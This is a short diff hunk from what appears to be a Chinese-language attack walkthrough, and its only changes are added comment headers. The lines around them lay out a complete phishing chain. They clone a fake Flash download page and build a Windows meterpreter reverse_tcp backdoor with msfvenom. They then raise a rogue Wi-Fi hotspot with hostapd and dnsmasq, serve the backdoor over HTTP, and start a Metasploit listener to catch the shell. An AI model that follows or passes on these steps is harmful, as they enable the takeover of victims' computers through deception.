@@ -57,14 +57,16 @@ window.alert = function(name){
 git clone https://github.com/r00tSe7en/Fake-flash.cn  
 
  
-#生成后门:  
+# 生成后门:  
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.1 LPORT=4444 -f exe -o /root/awa.exe  
 
+# 启动服务
 service apache2 start //启动web服务器  
 hostapd hostapd.conf //创建wifi  
 dnsmasq -C dnsmasq.conf -d //dns服务  
 python3 -m http.server 8080 //后门下载  
 
+# 开启监听
 msfconsole //启动  
 use exploit/multi/handler    //使用监听  
 set payload windows/x64/meterpreter/reverse_tcp   //设置payload  
